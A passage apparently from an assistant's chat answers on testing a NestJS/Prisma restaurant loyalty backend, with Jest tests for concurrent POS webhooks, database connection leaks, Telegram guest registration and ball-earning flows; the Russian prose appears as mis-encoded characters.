- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å = —Å—É–º–º–∞ –≤—Å–µ—Ö –Ω–∞—á–∏—Å–ª–µ–Ω–∏–π
- D) C + stress test (100+ concurrent webhooks)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Race conditions = —Ä–µ–∞–ª—å–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞ –≤ production –ø—Ä–∏ high load
- PostgreSQL `FOR UPDATE` –∏–ª–∏ Redis distributed locks –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã
- Stress test –Ω–∞—Ö–æ–¥–∏—Ç edge cases (deadlocks, timeouts)

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Concurrent Webhook Processing - Race Conditions (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.posTransaction.deleteMany();
    await prisma.guestCard.deleteMany();

    // Seed test data
    await prisma.guestCard.create({
      data: {
        id: 'card-1',
        userId: 'user-1',
        tenantId: 'tenant-1',
        totalBalance: 1000,
        phone: '+79991234567',
      },
    });
  });

  // 1. Sequential Processing - Baseline
  it('should process webhooks sequentially (baseline)', async () => {
    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-SEQ-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    // Process sequentially
    for (const webhook of webhooks) {
      await request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook);
    }

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000); // 1000 + (10 * 100) = 2000
  });

  // 2. Concurrent Processing - 10 Webhooks
  it('should handle 10 concurrent webhooks correctly', async () => {
    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-CONCURRENT-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    // Process concurrently
    const promises = webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    );

    await Promise.all(promises);

    // Check final balance (should be same as sequential)
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000); // 1000 + (10 * 100) = 2000

    // Check all transactions created
    const ballTransactions = await prisma.ballTransaction.findMany();
    expect(ballTransactions).toHaveLength(10);
  });

  // 3. Lost Update Problem - Without Locking
  it('should demonstrate lost update without locking', async () => {
    // Disable locking for this test (to show the problem)
    process.env.DISABLE_LOCKING = 'true';

    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-NO-LOCK-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // Without locking, balance will be incorrect
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBeLessThan(2000); // Lost updates!

    process.env.DISABLE_LOCKING = 'false';
  });

  // 4. Pessimistic Locking - SELECT FOR UPDATE
  it('should use pessimistic locking (SELECT FOR UPDATE)', async () => {
    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-PESSIMISTIC-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // With pessimistic locking, balance should be correct
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000);

    // Check query logs for "FOR UPDATE"
    const queryLog = await prisma.$queryRaw`
      SELECT query FROM pg_stat_statements 
      WHERE query LIKE '%FOR UPDATE%'
      LIMIT 1
    `;
    expect(queryLog).toBeTruthy();
  });

  // 5. Optimistic Locking - Version Field
  it('should use optimistic locking with version field', async () => {
    // Add version field to GuestCard
    await prisma.guestCard.update({
      where: { id: 'card-1' },
      data: { version: 1 },
    });

    const webhooks = Array(5).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-OPTIMISTIC-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    const results = await Promise.allSettled(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // Some requests should fail with version mismatch
    const conflicts = results.filter(r => r.status === 'rejected');
    expect(conflicts.length).toBeGreaterThan(0);

    // But final balance should still be correct (with retries)
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBeGreaterThanOrEqual(1500);
  });

  // 6. Distributed Lock - Redis
  it('should use Redis distributed lock', async () => {
    const redis = app.get('REDIS');

    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-REDIS-LOCK-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000);

    // Check that locks were released
    const lockKey = 'lock:guest:card-1';
    const lockExists = await redis.exists(lockKey);
    expect(lockExists).toBe(0);
  });

  // 7. Stress Test - 100 Concurrent Webhooks
  it('should handle 100 concurrent webhooks (stress test)', async () => {
    jest.setTimeout(60000); // 60 seconds timeout

    const webhooks = Array(100).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-STRESS-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    const startTime = Date.now();

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    const endTime = Date.now();
    const duration = endTime - startTime;

    console.log(`Processed 100 webhooks in ${duration}ms`);

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(11000); // 1000 + (100 * 100) = 11000

    // Check performance (should be < 30 seconds)
    expect(duration).toBeLessThan(30000);
  });

  // 8. Deadlock Detection
  it('should handle deadlocks gracefully', async () => {
    // Create 2 guest cards
    await prisma.guestCard.create({
      data: {
        id: 'card-2',
        userId: 'user-2',
        tenantId: 'tenant-1',
        totalBalance: 1000,
        phone: '+79991234568',
      },
    });

    // Simulate deadlock scenario:
    // Thread 1: Lock card-1, then card-2
    // Thread 2: Lock card-2, then card-1
    const promise1 = prisma.$transaction(async (tx) => {
      await tx.guestCard.update({
        where: { id: 'card-1' },
        data: { totalBalance: { increment: 100 } },
      });
      await new Promise(resolve => setTimeout(resolve, 100));
      await tx.guestCard.update({
        where: { id: 'card-2' },
        data: { totalBalance: { increment: 100 } },
      });
    });

    const promise2 = prisma.$transaction(async (tx) => {
      await tx.guestCard.update({
        where: { id: 'card-2' },
        data: { totalBalance: { increment: 100 } },
      });
      await new Promise(resolve => setTimeout(resolve, 100));
      await tx.guestCard.update({
        where: { id: 'card-1' },
        data: { totalBalance: { increment: 100 } },
      });
    });

    // One should succeed, one should fail with deadlock
    const results = await Promise.allSettled([promise1, promise2]);
    
    const succeeded = results.filter(r => r.status === 'fulfilled');
    const failed = results.filter(r => r.status === 'rejected');

    expect(succeeded).toHaveLength(1);
    expect(failed).toHaveLength(1);
    expect(failed[0].reason.message).toContain('deadlock');
  });
});
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –≤–æ–ø—Ä–æ—Å–∞–º–∏ **10-15**? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **10. Database Connection Pool - leak detection?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Prisma connection pool = 10 connections. –£—Ç–µ—á–∫–∞ ‚Üí production –ø–∞–¥–∞–µ—Ç.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å connection leaks?

- A) Unit test (–Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ)
- B) Integration test: –≤—ã–ø–æ–ª–Ω–∏—Ç—å 100 queries –ø–æ–¥—Ä—è–¥
- C) B + –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å active connections –≤ PostgreSQL
- D) C + automated test –≤ CI/CD (fail –µ—Å–ª–∏ leak –æ–±–Ω–∞—Ä—É–∂–µ–Ω)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Connection leaks = —á–∞—Å—Ç–∞—è –ø—Ä–∏—á–∏–Ω–∞ production outages
- Real database queries –Ω—É–∂–Ω—ã –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —É—Ç–µ—á–µ–∫
- Automated monitoring –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç regression

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Database Connection Pool - Leak Detection (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  afterAll(async () => {
    await app.close();
  });

  // Helper: Get active connections from PostgreSQL
  async function getActiveConnections(): Promise<number> {
    const result = await prisma.$queryRaw<[{ count: bigint }]>`
      SELECT COUNT(*) as count
      FROM pg_stat_activity
      WHERE datname = current_database()
        AND state = 'active'
        AND pid != pg_backend_pid();
    `;
    return Number(result[0].count);
  }

  // Helper: Get total connections
  async function getTotalConnections(): Promise<number> {
    const result = await prisma.$queryRaw<[{ count: bigint }]>`
      SELECT COUNT(*) as count
      FROM pg_stat_activity
      WHERE datname = current_database()
        AND pid != pg_backend_pid();
    `;
    return Number(result[0].count);
  }

  // 1. Baseline - Check Initial Connections
  it('should have minimal connections at start', async () => {
    const connections = await getTotalConnections();
    
    expect(connections).toBeLessThanOrEqual(2); // Prisma connection + test connection
  });

  // 2. Sequential Queries - No Leak
  it('should not leak connections with sequential queries', async () => {
    const initialConnections = await getTotalConnections();

    // Run 100 queries sequentially
    for (let i = 0; i < 100; i++) {
      await prisma.guestCard.findMany({ take: 10 });
    }

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 3. Concurrent Queries - Pool Saturation
  it('should handle concurrent queries without leaking', async () => {
    const initialConnections = await getTotalConnections();

    // Run 50 queries concurrently (exceeds pool size)
    const promises = Array(50).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    await Promise.all(promises);

    // Wait for connections to be released
    await new Promise(resolve => setTimeout(resolve, 1000));

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 2);
  });

  // 4. Transaction Leak Detection
  it('should not leak connections from transactions', async () => {
    const initialConnections = await getTotalConnections();

    // Run 20 transactions
    for (let i = 0; i < 20; i++) {
      await prisma.$transaction(async (tx) => {
        await tx.guestCard.findMany({ take: 10 });
        await tx.ballTransaction.findMany({ take: 10 });
      });
    }

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 5. Failed Transaction - Connection Released
  it('should release connection even if transaction fails', async () => {
    const initialConnections = await getTotalConnections();

    // Run failing transaction
    await expect(
      prisma.$transaction(async (tx) => {
        await tx.guestCard.findMany();
        throw new Error('Transaction failed');
      })
    ).rejects.toThrow('Transaction failed');

    // Wait for connection release
    await new Promise(resolve => setTimeout(resolve, 500));

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 6. Long-Running Query - Timeout
  it('should timeout long-running queries', async () => {
    jest.setTimeout(15000);

    const initialConnections = await getTotalConnections();

    // Simulate long-running query
    await expect(
      prisma.$queryRaw`SELECT pg_sleep(10)` // 10 seconds
    ).rejects.toThrow(/timeout|cancelled/);

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 7. Stress Test - Connection Pool Exhaustion
  it('should handle connection pool exhaustion gracefully', async () => {
    jest.setTimeout(30000);

    // Prisma pool size = 10
    // Run 100 queries concurrently (10x pool size)
    const promises = Array(100).fill(null).map((_, i) =>
      prisma.guestCard.findMany({ take: 10 }).catch(err => ({
        error: true,
        message: err.message,
      }))
    );

    const results = await Promise.all(promises);

    // Some queries should queue (not fail)
    const errors = results.filter((r: any) => r.error);
    expect(errors.length).toBe(0); // No errors (queued properly)

    // Wait for all connections to be released
    await new Promise(resolve => setTimeout(resolve, 2000));

    const finalConnections = await getTotalConnections();
    expect(finalConnections).toBeLessThanOrEqual(12);
  });

  // 8. Automated Leak Detection - CI/CD
  it('should detect connection leaks automatically', async () => {
    const initialConnections = await getTotalConnections();
    const maxAllowedConnections = initialConnections + 5;

    // Run realistic workload
    const promises = [];
    
    for (let i = 0; i < 50; i++) {
      promises.push(
        prisma.$transaction(async (tx) => {
          await tx.guestCard.findMany({ take: 10 });
          await tx.ballTransaction.create({
            data: {
              id: `tx-${i}`,
              guestCardId: 'card-1',
              amount: 100,
              source: 'TEST',
              sourceId: `test-${i}`,
              status: 'COMPLETED',
              earnedAt: new Date(),
            },
          });
        })
      );
    }

    await Promise.all(promises);

    // Monitor connections during execution
    const peakConnections = await getTotalConnections();
    
    console.log(`Peak connections: ${peakConnections}`);
    console.log(`Max allowed: ${maxAllowedConnections}`);

    // Fail test if connections exceed threshold
    if (peakConnections > maxAllowedConnections) {
      throw new Error(
        `Connection leak detected! Peak: ${peakConnections}, Max: ${maxAllowedConnections}`
      );
    }

    expect(peakConnections).toBeLessThanOrEqual(maxAllowedConnections);
  });

  // 9. PgBouncer Integration
  it('should work correctly with PgBouncer connection pooling', async () => {
    // If using PgBouncer, connections should be pooled at two levels:
    // 1. Prisma client pool (10 connections)
    // 2. PgBouncer pool (100 connections)

    const result = await prisma.$queryRaw<[{ setting: string }]>`
      SELECT setting FROM pg_settings WHERE name = 'max_connections';
    `;

    const maxConnections = parseInt(result[0].setting);
    console.log(`PostgreSQL max_connections: ${maxConnections}`);

    expect(maxConnections).toBeGreaterThanOrEqual(100); // PgBouncer recommended
  });

  // 10. Memory Leak Detection (related to connections)
  it('should not leak memory with many queries', async () => {
    jest.setTimeout(60000);

    const initialMemory = process.memoryUsage().heapUsed;

    // Run 1000 queries
    for (let i = 0; i < 1000; i++) {
      await prisma.guestCard.findMany({ take: 10 });
      
      // Force garbage collection periodically
      if (i % 100 === 0 && global.gc) {
        global.gc();
      }
    }

    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = finalMemory - initialMemory;
    const memoryIncreaseMB = memoryIncrease / 1024 / 1024;

    console.log(`Memory increase: ${memoryIncreaseMB.toFixed(2)} MB`);

    // Memory should not increase by more than 50MB
    expect(memoryIncreaseMB).toBeLessThan(50);
  });
});
```

**package.json (–¥–ª—è garbage collection):**

```json
{
  "scripts": {
    "test:integration": "node --expose-gc node_modules/.bin/jest --testMatch='**/*.integration.spec.ts'"
  }
}
```


***

## **–ë–õ–û–ö 3: E2E TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**


***

### **11. Guest Registration Flow - –ø–æ–ª–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ì–æ—Å—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è —á–µ—Ä–µ–∑ Telegram Bot.

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ —Ç–µ—Å—Ç–∏—Ä—É–µ–º E2E?

- A) API endpoints –æ—Ç–¥–µ–ª—å–Ω–æ (–Ω–µ E2E)
- B) –ü–æ–ª–Ω—ã–π flow: /start ‚Üí enter phone ‚Üí verify OTP ‚Üí profile created
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ guest card —Å–æ–∑–¥–∞–Ω —Å QR –∫–æ–¥–æ–º
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ welcome notification –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- E2E = —Ç–µ—Å—Ç–∏—Ä—É–µ–º –≤–µ—Å—å user journey end-to-end
- Guest card + QR –∫–æ–¥ –∫—Ä–∏—Ç–∏—á–Ω—ã –¥–ª—è loyalty program
- Welcome notification = –≤–∞–∂–Ω—ã–π UX —ç–ª–µ–º–µ–Ω—Ç

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/e2e/guest-registration.e2e.spec.ts
describe('Guest Registration Flow (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let telegramBot: any;
  let smsService: any;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    telegramBot = app.get('TELEGRAM_BOT');
    smsService = app.get(SmsService);
  });

  beforeEach(async () => {
    await prisma.user.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.notification.deleteMany();
  });

  afterAll(async () => {
    await app.close();
  });

  it('should complete full guest registration flow', async () => {
    const testPhone = '+79991234567';
    const testTelegramId = 123456789;

    // STEP 1: Guest starts bot (/start command)
    const startResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId, username: 'test_user' },
        text: '/start',
        chat: { id: testTelegramId },
      },
    });

    expect(startResponse.text).toContain('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å');
    expect(startResponse.reply_markup.keyboard).toContainEqual([
      { text: 'üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä', request_contact: true },
    ]);

    // STEP 2: Guest shares phone number
    jest.spyOn(smsService, 'send').mockResolvedValue({ success: true });

    const phoneResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        contact: {
          phone_number: testPhone,
          user_id: testTelegramId,
        },
        chat: { id: testTelegramId },
      },
    });

    expect(phoneResponse.text).toContain('–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è');
    expect(smsService.send).toHaveBeenCalledWith(
      testPhone,
      expect.stringMatching(/\d{6}/)
    );

    // Get OTP code from mock
    const otpCode = smsService.send.mock.calls[0][1].match(/\d{6}/)[0];

    // STEP 3: Guest enters OTP
    const otpResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: otpCode,
        chat: { id: testTelegramId },
      },
    });

    expect(otpResponse.text).toContain('–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω');

    // STEP 4: Guest enters name
    const nameResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: '–ò–≤–∞–Ω',
        chat: { id: testTelegramId },
      },
    });

    expect(nameResponse.text).toContain('–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞');

    // STEP 5: Verify database records created
    const user = await prisma.user.findUnique({
      where: { phone: testPhone },
      include: {
        guestProfile: true,
        guestCards: true,
      },
    });

    expect(user).toBeTruthy();
    expect(user.role).toBe('GUEST');
    expect(user.phoneVerified).toBe(true);
    expect(user.telegramId).toBe(testTelegramId.toString());
    expect(user.guestProfile.firstName).toBe('–ò–≤–∞–Ω');

    // STEP 6: Verify guest card created
    expect(user.guestCards).toHaveLength(1);
    const guestCard = user.guestCards[0];
    
    expect(guestCard.totalBalance).toBe(0);
    expect(guestCard.status).toBe('ACTIVE');
    expect(guestCard.qrCode).toBeTruthy();
    expect(guestCard.displayCode).toMatch(/^\d{6}$/);

    // STEP 7: Verify QR code generated
    const qrCodeExists = await checkS3FileExists(guestCard.qrCode);
    expect(qrCodeExists).toBe(true);

    // STEP 8: Verify welcome notification sent
    const welcomeNotification = await prisma.notification.findFirst({
      where: {
        recipientId: user.id,
        type: 'WELCOME',
      },
    });

    expect(welcomeNotification).toBeTruthy();
    expect(welcomeNotification.status).toBe('DELIVERED');
    expect(welcomeNotification.channel).toBe('TELEGRAM');

    // STEP 9: Verify guest can view balance
    const balanceResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: '/balance',
        chat: { id: testTelegramId },
      },
    });

    expect(balanceResponse.text).toContain('–í–∞—à –±–∞–ª–∞–Ω—Å: 0 –±–∞–ª–ª–æ–≤');
  });

  // Edge Case: Phone already registered
  it('should handle duplicate phone number registration', async () => {
    const testPhone = '+79991234567';
    
    // Pre-create user
    await prisma.user.create({
      data: {
        phone: testPhone,
        role: 'GUEST',
        phoneVerified: true,
      },
    });

    // Try to register again
    const response = await telegramBot.handleUpdate({
      message: {
        from: { id: 999999 },
        contact: { phone_number: testPhone, user_id: 999999 },
        chat: { id: 999999 },
      },
    });

    expect(response.text).toContain('—É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω');
  });

  // Edge Case: Invalid OTP
  it('should reject invalid OTP code', async () => {
    const testPhone = '+79991234567';
    const testTelegramId = 123456789;

    // Send phone
    await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        contact: { phone_number: testPhone, user_id: testTelegramId },
        chat: { id: testTelegramId },
      },
    });

    // Send invalid OTP
    const response = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: '000000', // Invalid
        chat: { id: testTelegramId },
      },
    });

    expect(response.text).toContain('–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥');
  });
});

// Helper function
async function checkS3FileExists(key: string): Promise<boolean> {
  try {
    const s3 = app.get('S3_CLIENT');
    await s3.headObject({ Bucket: process.env.S3_BUCKET, Key: key });
    return true;
  } catch {
    return false;
  }
}
```


***

### **12. Ball Earning Flow - –æ—Ç webhook –¥–æ notification?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ì–æ—Å—Ç—å –æ–ø–ª–∞—Ç–∏–ª —á–µ–∫ ‚Üí POS webhook ‚Üí –±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã ‚Üí notification.

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ –ø—Ä–æ–≤–µ—Ä—è–µ–º E2E?

- A) Webhook –æ–±—Ä–∞–±–æ—Ç–∞–Ω –±–µ–∑ –æ—à–∏–±–æ–∫
- B) –ë–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å –≤ –ë–î)
- C) B + notification sent (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤ Telegram/Email)
- D) C + audit log —Å–æ–∑–¥–∞–Ω + analytics updated

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- E2E = –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤–µ—Å—å flow –æ—Ç –Ω–∞—á–∞–ª–∞ –¥–æ –∫–æ–Ω—Ü–∞
- Audit log –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è compliance
- Analytics –Ω—É–∂–µ–Ω –¥–ª—è dashboards

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Ball Earning Flow - POS to Notification (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let queue: Queue;
  let telegramBot: any;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    queue = app.get('BullQueue_notifications');
    telegramBot = app.get('TELEGRAM_BOT');
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.posTransaction.deleteMany();
    await prisma.auditLog.deleteMany();
    await prisma.notification.deleteMany();
    await queue.clean(0, 'completed');
    await queue.clean(0, 'failed');

    // Seed test data
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        telegramId: '123456789',
        guestProfile: {
          create: {
            firstName: '–ò–≤–∞–Ω',
          },
        },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            restaurantId: 'restaurant-1',
            totalBalance: 1000,
            qrCode: 'qr-1',
            displayCode: '000001',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should complete full ball earning flow', async () => {
    const checkAmount = 2850;
    const expectedBalls = 285; // 10% of 2850

    // STEP 1: POS sends webhook
    const webhookResponse = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-E2E-123',
        tenantId: 'tenant-1',
        restaurantId: 'restaurant-1',
        checkAmount,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
        items: [
          { name: 'Burger', price: 500, quantity: 2 },
          { name: 'Fries', price: 200, quantity: 3 },
          { name: 'Coke', price: 150, quantity: 5 },
        ],
      })
      .expect(200);

    expect(webhookResponse.body.success).toBe(true);

    // STEP 2: Verify POS transaction created
    const posTransaction = await prisma.posTransaction.findFirst({
      where: { posCheckId: 'CHK-E2E-123' },
    });

    expect(posTransaction).toBeTruthy();
    expect(posTransaction.syncStatus).toBe('COMPLETED');
    expect(posTransaction.checkAmount.toNumber()).toBe(checkAmount);

    // STEP 3: Verify ball transaction created
    const ballTransaction = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-E2E-123' },
    });

    expect(ballTransaction).toBeTruthy();
    expect(ballTransaction.amount).toBe(expectedBalls);
    expect(ballTransaction.source).toBe('POS_WEBHOOK');
    expect(ballTransaction.status).toBe('COMPLETED');
    expect(ballTransaction.earnedAt).toBeInstanceOf(Date);

    // STEP 4: Verify guest card balance updated
    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(1285); // 1000 + 285
    expect(guestCard.totalEarned).toBe(285);
    expect(guestCard.lastActivityAt).toBeInstanceOf(Date);

    // STEP 5: Verify notification sent via BullMQ
    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for queue processing

    const notification = await prisma.notification.findFirst({
      where: {
        recipientId: 'user-1',
        type: 'BALLS_EARNED',
      },
      include: {
        analytics: true,
      },
    });

    expect(notification).toBeTruthy();
    expect(notification.status).toBe('DELIVERED');
    expect(notification.channel).toBe('TELEGRAM');
    expect(notification.message).toContain('285');
    expect(notification.message).toContain('2850');

    // STEP 6: Verify Telegram message sent
    expect(telegramBot.telegram.sendMessage).toHaveBeenCalledWith(
      '123456789',
      expect.stringContaining('285 –±–∞–ª–ª–æ–≤'),
      expect.any(Object)
    );

    // STEP 7: Verify audit log created
    const auditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'BALLS_CREDITED',
        targetType: 'BallTransaction',
        targetId: ballTransaction.id,
      },
    });

    expect(auditLog).toBeTruthy();
    expect(auditLog.userId).toBe('user-1');
    expect(auditLog.tenantId).toBe('tenant-1');
    expect(auditLog.metadata).toMatchObject({
      amount: expectedBalls,
      source: 'POS_WEBHOOK',
      checkAmount,
    });

    // STEP 8: Verify analytics updated
    expect(notification.analytics).toBeTruthy();
    expect(notification.analytics.openedAt).toBeNull(); // Not opened yet

    // STEP 9: Simulate guest opening notification
    await request(app.getHttpServer())
      .post(`/api/v1/notifications/${notification.id}/track`)
      .send({ event: 'opened' })
      .expect(200);

    const updatedNotification = await prisma.notification.findUnique({
      where: { id: notification.id },
      include: { analytics: true },
    });

    expect(updatedNotification.analytics.openedAt).toBeInstanceOf(Date);
  });

  // Test: Multiple transactions in sequence
  it('should handle multiple transactions correctly', async () => {
    // Transaction 1: 1000 —Ä—É–±
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-1',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Transaction 2: 2000 —Ä—É–±
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
